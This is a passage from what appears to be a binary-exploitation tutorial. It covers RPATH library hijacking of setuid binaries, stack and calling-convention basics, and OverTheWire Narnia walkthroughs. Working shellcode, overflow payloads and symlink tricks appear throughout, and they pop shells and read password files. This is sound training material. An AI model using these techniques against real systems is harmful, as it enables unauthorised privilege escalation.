<p>If there’s exist a suid binary with a RPATH defined which we control, we can get code execution. Let’s first read what’s rpath?</p>
<div class="section" id="rpath">
<h4>RPATH<a class="headerlink" href="#rpath" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://en.wikipedia.org/wiki/Rpath">rpath</a> designates the run-time search path hard-coded in an executable file or library. Dynamic linking loaders use the rpath to find required libraries. Specifically it encodes a path to shared libraries into the header of an executable (or another shared library). This RPATH header value (so named in the Executable and Linkable Format header standards) may either override or supplement the system default dynamic linking search paths.</p>
<p>Libraries loaded from the run-time path defined by RPATH wont disable the setuid execution as LDPRELOAD would do. So we can inject our own libc.so.6 (Using version GLIBC2.0 as required by the binary) in the RPATH directory and hook any of the used functions to execute our setuid shell.</p>
<p>We can use readelf to check the dynamic section of a binary</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>readelf -d flagXX

Dynamic section at offset 0xf20 contains 21 entries:
 Tag        Type                         Name/Value
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flagXX]
0x0000000c (INIT)                       0x80482c0
</pre></div>
</div>
<p>In the above example, we can see that RPATH is defined as /var/tmp/flagXX, so the binary tries to load the libc.so.6 from that location.</p>
<p>Let’s see what are the functions the binary utilizes from libc</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>objdump -R flagXX

flagXX:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
</pre></div>
</div>
<p>If RPATH is writeable, we can possibly get a shell by creating a fake libc.so and defining fake __libc_start_main function with</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>system(&quot;/bin/sh&quot;);
</pre></div>
</div>
<p>to get a shell. We may also refer <a class="reference external" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux x86 Program Start Up or - How the heck do we get to main()?</a> to understand what happens when we execute a linux binary (shared not static).</p>
</div>
<div class="section" id="libc-start-main">
<h4>libc_start_main<a class="headerlink" href="#libc-start-main" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">linuxbase</a> The _libcstart_main() function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end));
</pre></div>
</div>
</div>
<div class="section" id="gmon-start">
<h4>gmon_start<a class="headerlink" href="#gmon-start" title="Permalink to this headline">¶</a></h4>
<p>The function call_gmon_start initializes the gmon profiling system. This system is enabled when binaries are compiled with the -pg flag, and creates output for use with gprof(1). In the case of the scenario binary call_gmon_start is situated directly proceeding that _start function. The call_gmon_start function finds the last entry in the Global Offset Table (also known as __gmon_start__) and, if not NULL, will pass control to the specified address. The __gmon_start__ element points to the gmon initialization function, which starts the recording of profiling information and registers a cleanup function with atexit(). In our case however gmon is not in use, and as such __gmon_start__ is NULL.</p>
</div>
<div class="section" id="version-reference">
<h4>Version Reference<a class="headerlink" href="#version-reference" title="Permalink to this headline">¶</a></h4>
<p>GLib provides version information, primarily useful in configure checks for builds that have a configure script.</p>
<p>Check glib version in binary</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>objdump -p flagXX

flagXX:     file format elf32-i386

Version References:
 required from libc.so.6:
   0x0d696910 0x00 02 GLIBC_2.0
</pre></div>
</div>
<p>or</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>objdump -T flagXX

flagXX:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND* 00000000  GLIBC_2.0   puts
00000000  w   D  *UND* 00000000              __gmon_start__
00000000      DF *UND* 00000000  GLIBC_2.0   __libc_start_main
080484cc g    DO .rodata       00000004  Base        _IO_stdin_used
</pre></div>
</div>
<p>Check glib version in your linux machine</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>ldd --version
ldd (Debian GLIBC 2.26-2) 2.26
</pre></div>
</div>
<p>If you get error like “no version information available”, create a file version.ld with the version required.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>cat version.ld
GLIBC_2.0 {
};
</pre></div>
</div>
<p>and link it while compiling</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic shell.c -o libc.so.6
</pre></div>
</div>
</div>
<div class="section" id="ld-debug-environment-variable">
<h4>LD_DEBUG environment variable<a class="headerlink" href="#ld-debug-environment-variable" title="Permalink to this headline">¶</a></h4>
<p>If the LD_DEBUG variable is set then the Linux dynamic linker will dump debug information which can be used to resolve most loading problems very quickly. To see the available options just run any program with the variable set to help, i.e.:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>LD_DEBUG=help cat
Valid options for the LD_DEBUG environment variable are:

 libs        display library search paths
 reloc       display relocation processing
 files       display progress for input file
 symbols     display symbol table processing
 bindings    display information about symbol binding
 versions    display version dependencies
 all         all previous options combined
 statistics  display relocation statistics
 unused      determined unused DSOs
 help        display this help message and exit
</pre></div>
</div>
<p>If you want to debug a binary</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>LD_DEBUG all ./flagXX

D_DEBUG=all ./flagXX
     4796:
     4796:     file=libc.so.6 [0];  needed by ./flagXX [0]
     4796:     find library=libc.so.6 [0]; searching
     4796:      search path=/var/tmp/flagXX/tls/i686/sse2/cmov:/var/tmp/flagXX/tls/i686/sse2:/var/tmp/flagXX/tls/i686/cmov:/var/tmp/flagXX/tls/i686:/var/tmp/flagXX/tls/sse2/cmov:/var/tmp/flagXX/tls/sse2:/var/tmp/flagXX/tls/cmov:/var/tmp/flagXX/tls:/var/tmp/flagXX/i686/sse2/cmov:/var/tmp/flagXX/i686/sse2:/var/tmp/flagXX/i686/cmov:/var/tmp/flagXX/i686:/var/tmp/flagXX/sse2/cmov:/var/tmp/flagXX/sse2:/var/tmp/flagXX/cmov:/var/tmp/flagXX            (RPATH from file ./flagXX)
     4796:       trying file=/var/tmp/flagXX/tls/i686/sse2/cmov/libc.so.6
</pre></div>
</div>
</div>
</div>
<div class="section" id="ulimit">
<h3>ulimit<a class="headerlink" href="#ulimit" title="Permalink to this headline">¶</a></h3>
<p>ulimit
User limits - limit the use of system-wide resources.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Syntax
     ulimit [-acdfHlmnpsStuv] [limit]

Options

  -S   Change and report the soft limit associated with a resource.
  -H   Change and report the hard limit associated with a resource.

  -a   All current limits are reported.
  -c   The maximum size of core files created.
  -d   The maximum size of a process&#39;s data segment.
  -f   The maximum size of files created by the shell(default option)
  -l   The maximum size that can be locked into memory.
  -m   The maximum resident set size.
  -n   The maximum number of open file descriptors.
  -p   The pipe buffer size.
  -s   The maximum stack size.
  -t   The maximum amount of cpu time in seconds.
  -u   The maximum number of processes available to a single user.
  -v   The maximum amount of virtual memory available to the process.
</pre></div>
</div>
<p>ulimit provides control over the resources available to the shell and to processes started by it, on systems that allow such control.</p>
<p>The soft limit is the value that the kernel enforces for the corresponding resource. The hard limit acts as a ceiling for the soft limit.</p>
</div>
</div>
<div class="section" id="appendix-iii-basic-concepts">
<h2>Appendix-III Basic Concepts<a class="headerlink" href="#appendix-iii-basic-concepts" title="Permalink to this headline">¶</a></h2>
<p>The below has been completely taken from <a class="reference external" href="https://ctf101.org/binary-exploitation/overview/">Binary Exploitation CTF101</a></p>
<p>Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable.
Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program’s functions.</p>
<div class="section" id="registers">
<h3>Registers<a class="headerlink" href="#registers" title="Permalink to this headline">¶</a></h3>
<p>A register is a location within the processor that is able to store data, much like RAM.</p>
<p>Registers can hold any value: addresses (pointers), results from mathematical operations, characters, etc. Some registers are reserved however, meaning they have a special purpose and are not “general purpose registers” (GPRs).</p>
<p>On x86, the only 2 reserved registers are</p>
<ul class="simple">
<li>rip which hold the address of the next instruction to execute and</li>
<li>rsp which hold the address of the stack respectively.</li>
</ul>
<p>On x86, the same register can have different sized accesses for backwards compatability. For example,</p>
<ul class="simple">
<li>the rax register is the full 64-bit register,</li>
<li>eax is the low 32 bits of rax,</li>
<li>ax is the low 16 bits,</li>
<li>al is the low 8 bits, and ah is the high 8 bits of ax (bits 8-16 of rax).</li>
</ul>
</div>
<div class="section" id="stack">
<h3>Stack<a class="headerlink" href="#stack" title="Permalink to this headline">¶</a></h3>
<p>In computer architecture, the stack is a hardware manifestation of the stack data structure (a Last In, First Out queue).</p>
<ul class="simple">
<li>The esp/rsp register holds the address in memory where the bottom of the stack resides.</li>
<li>When something is pushed to the stack, esp decrements by 4 (or 8 on 64-bit x86), and the value that was pushed is stored at that location in memory.</li>
<li>Likewise, when a pop instruction is executed, the value at esp is retrieved (i.e. esp is dereferenced), and esp is then incremented by 4 (or 8).</li>
</ul>
<p>..Note :: The stack “grows” down to lower memory addresses!</p>
<ul class="simple">
<li>Conventionally, ebp/rbp contains the address of the top of the current stack frame, and so sometimes local variables are referenced as an offset relative to ebp rather than an offset to esp.</li>
<li>A stack frame is essentially just the space used on the stack by a given function.</li>
</ul>
<div class="section" id="uses">
<h4>Uses<a class="headerlink" href="#uses" title="Permalink to this headline">¶</a></h4>
<p>The stack is primarily used for a few things:</p>
<ul class="simple">
<li>Storing function arguments</li>
<li>Storing local variables</li>
<li>Storing processor state between function calls</li>
</ul>
</div>
<div class="section" id="example">
<h4>Example<a class="headerlink" href="#example" title="Permalink to this headline">¶</a></h4>
<p>Let’s compile a simple program and check for stack</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
void say_hi(const char * name) {
   printf(&quot;Hello %s!\n&quot;, name);
}

int main(int argc, char ** argv) {
   char * name;
   if (argc != 2) {
       return 1;
   }
   name = argv[1];
   say_hi(name);
   return 0;
}
</pre></div>
</div>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gcc -g hello.c -o hello
</pre></div>
</div>
<p>Put breakpoints at the call of say_hi function</p>
<ul class="simple">
<li>Check whats the esp and ebp value.</li>
<li>When a call instruction is executed; call instructions first push the current instruction pointer to the stack, then jump to their destination.</li>
<li>The first thing say_hi does is save the current ebp so that when it returns, ebp is back where main expects it to be.</li>
</ul>
</div>
</div>
<div class="section" id="calling-conventions">
<h3>Calling Conventions<a class="headerlink" href="#calling-conventions" title="Permalink to this headline">¶</a></h3>
<p>To be able to call functions, there needs to be an agreed-upon way to pass arguments.</p>
<p>In Linux binaries, there are really only two commonly used calling conventions: cdecl for 32-bit binaries, and SysV for 64-bit</p>
<div class="section" id="cdecl">
<h4>cdecl<a class="headerlink" href="#cdecl" title="Permalink to this headline">¶</a></h4>
<p>In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>int add(int a, int b, int c) {
   return a + b + c;
   }
</pre></div>
</div>
<p>would be invoked by pushing c, then b, then a.</p>
</div>
<div class="section" id="sysv">
<h4>SysV<a class="headerlink" href="#sysv" title="Permalink to this headline">¶</a></h4>
<p>For 64-bit binaries, function arguments are first passed in certain registers:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>RDI
RSI
RDX
RCX
R8
R9
</pre></div>
</div>
<p>then any leftover arguments are pushed onto the stack in reverse order, as in cdecl.</p>
</div>
</div>
<div class="section" id="global-offset-table">
<h3>Global Offset Table<a class="headerlink" href="#global-offset-table" title="Permalink to this headline">¶</a></h3>
<p>The Global Offset Table (or GOT) is a section inside of programs that holds addresses of functions that are dynamically linked. common functions (like those in libc) are “linked”
into the program so they can be saved once on disk and reused by every program.</p>
<p>Unless a program is marked full RELRO, the resolution of function to address in dynamic library is done lazily. All dynamic libraries are loaded into memory along with the main program at launch, however functions are not mapped to their actual code until they’re first called. For example, in the following C snippet puts won’t be resolved to an address in libc until after it has been called once:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>int main() {
   puts(&quot;Hi there!&quot;);
   puts(&quot;Ok bye now.&quot;);
   return 0;
}
</pre></div>
</div>
<p>To avoid searching through shared libraries each time a function is called, the result of the lookup is saved into the GOT so future function calls “short circuit” straight to their implementation bypassing the dynamic resolver.</p>
<p>This has two important implications:</p>
<ul class="simple">
<li>The GOT contains pointers to libraries which move around due to ASLR</li>
<li>The GOT is writable</li>
</ul>
<div class="section" id="plt">
<h4>PLT<a class="headerlink" href="#plt" title="Permalink to this headline">¶</a></h4>
<p>Before a functions address has been resolved, the GOT points to an entry in the Procedure Linkage Table (PLT). This is a small “stub” function which is responsible for calling the dynamic linker with (effectively) the name of
the function that should be resolved.</p>
</div>
</div>
<div class="section" id="buffer">
<h3>Buffer<a class="headerlink" href="#buffer" title="Permalink to this headline">¶</a></h3>
<p>A buffer is any allocated space in memory where data (often user input) can be stored.</p>
<p>In the following C program name would be considered a stack buffer:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;

int main() {
char name[64] = {0};
read(0, name, 63);
printf(&quot;Hello %s&quot;, name);
return 0;
}
</pre></div>
</div>
<p>Buffers could also be global variables:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
char name[64] = {0};
int main() { code_snippet }
</pre></div>
</div>
<p>Or dynamically allocated on the heap like</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>char *name = malloc(64);
memset(name, 0, 64);
</pre></div>
</div>
</div>
</div>
<div class="section" id="buffer-overflow-examples">
<h2>Buffer Overflow Examples<a class="headerlink" href="#buffer-overflow-examples" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li>Let’s see a simple example of binary exploitation Narnia0 where we have to write a written value.</li>
</ul>
<blockquote>
<div><div class="code c highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
    long val=0x41414141;
    char buf[20];

    printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);
    printf(&quot;Here is your chance: &quot;);
    scanf(&quot;%24s&quot;,&amp;buf);

    printf(&quot;buf: %s\n&quot;,buf);
    printf(&quot;val: 0x%08x\n&quot;,val);

    if(val==0xdeadbeef)
        system(&quot;/bin/sh&quot;);
    else {
        printf(&quot;WAY OFF!!!!\n&quot;);
        exit(1);
    }

    return 0;
}
</pre></div>
</div>
<p>In this example, value of variable val can be overwritten by overflowing buf. Another small observation is scanf function scans 24 characters. If you directly write 20 “A” and the address it won’t work as the val doesn’t matches. So, we have to use python print command. If we use</p>
<div class="code python highlight-None notranslate"><div class="highlight"><pre><span></span>python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0
</pre></div>
</div>
<p>you will see that the value would match but the shell is exited. To keep the shell active, we need to use cat as shown below:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39;;cat) | ./narnia0
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>In another example below Narnia1</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;

int main(){
    int (*ret)();

    if(getenv(&quot;EGG&quot;)==NULL){
        printf(&quot;Give me something to execute at the env-variable EGG\n&quot;);
        exit(1);
    }

    printf(&quot;Trying to execute EGG!\n&quot;);
    ret = getenv(&quot;EGG&quot;);
    ret();

    return 0;
}
</pre></div>
</div>
<p>We need to set a environment variable EGG with an shellcode. Previously, I tried with</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>export EGG=&quot;\bin\sh&quot;
and
export EGG=&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;
</pre></div>
</div>
<p>Shellcode were taken from the Shellstorm website. However, both failed with Segmentation fault. superkojiman, barrebas helped me with and told that if I write</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>export EGG=`python -c &#39;print &quot;\xCC&quot;&#39;`
</pre></div>
</div>
<p>It should sigtrap. “xCC” acts as a software breakpoint, basically an INT3, It tells you whether your shellcode is stored properly &amp; executed, if the program receives SIGTRAP, you know you’re good to go, and it’s a good way to make sure you’ve properly redirected execution to your shellcode. You can further put “xCC” anywhere in the shellcode, if it crashes before “xCC”, you know for sure that your shellcode has bad characters. They suggested to export the EGG variable as</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>export EGG=`python -c &#39;print &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`
</pre></div>
</div>
<p>and it worked like a charm.</p>
</div></blockquote>
<ul class="simple">
<li>In another example Narnia2</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf(&quot;Usage: %s argument\n&quot;, argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf(&quot;%s&quot;, buf);

    return 0;
}
</pre></div>
</div>
<p>It’s to easy that buffer overflow vulnerability exists because of strcpy. Let’s see what is the offset for this.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>ulimit -c unlimited
./narnia2 `/usr/share/metasploit-framework/tools/pattern_create.rb 200`
Segmentation fault (core dumped)

gdb -q -c core ./narnia2
#0  0x37654136 in ?? ()

/usr/share/metasploit-framework/tools/pattern_offset.rb 0x37654136
[*] Exact match at offset 140
narnia2@melinda:~$ gdb -q /narnia/narnia2
(gdb) disassemble main
Dump of assembler code for function main:
**Snip**
   0x080484a0 &lt;+67&gt;:    mov    %eax,(%esp)
   0x080484a3 &lt;+70&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
**Snip**
End of assembler dump.
(gdb) br *main+70
Breakpoint 1 at 0x80484a3
(gdb) run `python -c &#39;print &quot;A&quot;*140 + &quot;BBBB&quot;&#39;`
Starting program: /games/narnia/narnia2 `python -c &#39;print &quot;A&quot;*140 + &quot;BBBB&quot;&#39;`

Breakpoint 1, 0x080484a3 in main ()
(gdb) n
0x42424242 in ?? ()
</pre></div>
</div>
<p>Let’s see the stack after the strcpy, which would tell us the probable address we want to redirect execution.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) x/80xw $esp+400
0xffffd7e0: 0x0000000f  0xffffd80b  0x00000000  0x00000000
0xffffd7f0: 0x00000000  0x00000000  0x1d000000  0xa9c79d1b
0xffffd800: 0xe1a67367  0xc19fc850  0x6996cde4  0x00363836
0xffffd810: 0x2f000000  0x656d6167  0x616e2f73  0x61696e72
0xffffd820: 0x72616e2f  0x3261696e  0x41414100  0x41414141
0xffffd830: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd840: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd850: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd860: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd870: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd880: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd890: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8b0: 0x41414141  0x42424241  0x44580042  0x45535f47
0xffffd8c0: 0x4f495353  0x44495f4e  0x3939383d  0x53003733
</pre></div>
</div>
<p>Let pick a shellcode from shellstorm for a Linux x86 execuve /bin/sh and calculate the number of NOPs</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia2@melinda:~$ python -c &#39;print len(&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;)&#39;
23
narnia2@melinda:~$ bc
140-23
117
narnia2@melinda:~$ /narnia/narnia2 `python -c &#39;print &quot;\x90&quot;*117 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;\x50\xd8\xff\xff&quot;&#39;`
$ cat /etc/narnia_pass/narnia3
**********
$
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>In another example Narnia3</li>
</ul>
<blockquote>
<div><div class="code c highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = &quot;/dev/null&quot;;
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf(&quot;usage, %s file, will send contents of file 2 /dev/null\n&quot;,argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
                printf(&quot;error opening %s\n&quot;, ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){
                printf(&quot;error opening %s\n&quot;, ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf(&quot;copied contents of %s to a safer place... (%s)\n&quot;,ifile,ofile);

        /* close &#39;em */
        close(ifd);
        close(ofd);

        exit(1);
}
</pre></div>
</div>
<p>Superkojiman notes explain this best, copied here with permission, thanks superkojiman :)</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia3@melissa:/narnia$ ./narnia3 /etc/motd
copied contents of /etc/motd to a safer place... (/dev/null)
</pre></div>
</div>
<p>We can use this program to read the contents of /etc/narnia_pass/narnia4, but the output is written to /dev/null. We control the input file and the output file is set as /dev/null. However, because of the way the stack is laid out, we can write past the ifile buffer and overwrite the value of ofile. This lets us replace /dev/null with another file of our choosing. Here’s what the stack looks like:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>+---------+
|  ret    |
|  sfp    |
|  ofd    |
|  ifd    |
|  ofile  |
|  ifile  |
|  buf    |
+---------+ &lt;- esp
</pre></div>
</div>
<p>ifile and ofile are 32-byte arrays. We can compile the program with -ggdb and examine it in gdb</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span># gcc -ggdb -m32 -fno-stack-protector -Wl,-z,norelro narnia3.c -o narnia3
# gdb -q narnia3
</pre></div>
</div>
<p>If we disas main, we can see that strcpy is called at *main+100:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>0x08048551 &lt;+93&gt;:    lea    0x38(%esp),%eax
0x08048555 &lt;+97&gt;:    mov    %eax,(%esp)
0x08048558 &lt;+100&gt;:   call   0x8048400 &lt;strcpy@plt&gt;
0x0804855d &lt;+105&gt;:   movl   $0x2,0x4(%esp)
0x08048565 &lt;+113&gt;:   lea    0x58(%esp),%eax
0x08048569 &lt;+117&gt;:   mov    %eax,(%esp)
</pre></div>
</div>
<p>We set a breakpoint there and run the program with the following arguments:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) r `python -c &#39;print &quot;A&quot;*32 + &quot;/tmp/hack&quot;&#39;`
Starting program: /root/wargames/narnia/3/narnia3 `python -c &#39;print &quot;A&quot;*32 + &quot;/tmp/hack&quot;&#39;`

Breakpoint 1, 0x08048558 in main (argc=2, argv=0xbffff954) at narnia3.c:37
37          strcpy(ifile, argv[1]);
</pre></div>
</div>
<p>At the first breakpoint, we examine the local variables</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) i locals
ifd = 134514299
ofd = -1208180748
ofile = &quot;/dev/null\000\000\000\000\000\000&quot;
ifile = &quot;x\370\377\277\234\203\004\b\200\020\377\267\214\230\004\b\250\370\377\277\211\206\004\b$\243\374\267\364\237&quot;, &lt;incomplete sequence \374\267&gt;
buf = &quot;\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b&quot;
</pre></div>
</div>
<p>ofile is set to /dev/null as expected. We’ll step to the next instruction and check again.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span> (gdb) s
 38          if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
 (gdb) i locals
 ifd = 134514299
 ofd = -1208180748
 ofile = &quot;/tmp/hack\000\000\000\000\000\000&quot;
 ifile = &#39;A&#39; &lt;repeats 32 times&gt;
 buf = &quot;\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b&quot;

As expected, ofile has been overwritten to /tmp/hack. However ifile is now AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack so in order to read /etc/narnia_pass/narnia4, we need to create a directory AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp and symlink /etc/narnia_pass/narnia4 to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack
</pre></div>
</div>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia3@melissa:/tmp/skojiman3$ mkdir -p AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp
narnia3@melissa:/tmp/skojiman3$ ln -s /etc/narnia_pass/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack
</pre></div>
</div>
<p>Next we need to create the output file /tmp/hack that ofile points to</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia3@melissa:/tmp/skojiman3$ touch /tmp/hack
narnia3@melissa:/tmp/skojiman3$ chmod 666 /tmp/hack
narnia3@melissa:/tmp/skojiman3$ ls -l /tmp/hack
-rw-rw-rw- 1 narnia3 narnia3 0 2012-11-24 22:58 /tmp/hack
</pre></div>
</div>
<p>Finally, execute /narnia/narnia3 as follows:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia3@melissa:/tmp/skojiman3$ /narnia/narnia3 `python -c &#39;print &quot;A&quot;*32 + &quot;/tmp/hack&quot;&#39;`
copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack to a safer place... (/tmp/hack)
narnia3@melissa:/tmp/skojiman3$ cat /tmp/hack
thaenohtai
��*������e���@�narnia3@melissa:/tmp/skojiman3$
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Let’s see another example Narnia6.</li>
</ul>
<blockquote>
<div><div class="code c highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__(&quot;movl %esp,%eax\n\t&quot;
               &quot;and $0xff000000, %eax&quot;
               );
}

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int  (*fp)(char *)=(int(*)(char *))&amp;puts, i;

    if(argc!=3){ printf(&quot;%s b1 b2\n&quot;, argv[0]); exit(-1); }

    /* clear environ */
    for(i=0; environ[i] != NULL; i++)
        memset(environ[i], &#39;\0&#39;, strlen(environ[i]));
    /* clear argz    */
    for(i=3; argv[i] != NULL; i++)
        memset(argv[i], &#39;\0&#39;, strlen(argv[i]));

    strcpy(b1,argv[1]);
    strcpy(b2,argv[2]);
    //if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)
    if(((unsigned long)fp &amp; 0xff000000) == get_sp())
        exit(-1);
    fp(b1);

    exit(1);
}
</pre></div>
</div>
<p>Stack is not executable for this binary. This binary is an example of “return-to-libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, rendering the NX bit feature useless (if present) and ridding the attacker of the need to inject their own code.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb -q narnia6
Reading symbols from /home/bitvijays/narnia6...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
gdb-peda$
</pre></div>
</div>
<p>Let’s compile the source on the local and check what happens:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gcc -m32 -ggdb -fno-stack-protector -Wall narnia6.c -o narnia61
</pre></div>
</div>
<p>If you see carefully, we passed A<em>8 + BBBB + ” ” + “C”</em>8 + DDDD, which resulted in</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb -q ./narnia61
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x080486d2 &lt;+330&gt;:   call   0x8048450 &lt;exit@plt&gt;
   0x080486d7 &lt;+335&gt;:   lea    eax,[esp+0x20]
   0x080486db &lt;+339&gt;:   mov    DWORD PTR [esp],eax
   0x080486de &lt;+342&gt;:   mov    eax,DWORD PTR [esp+0x28]
   0x080486e2 &lt;+346&gt;:   call   eax
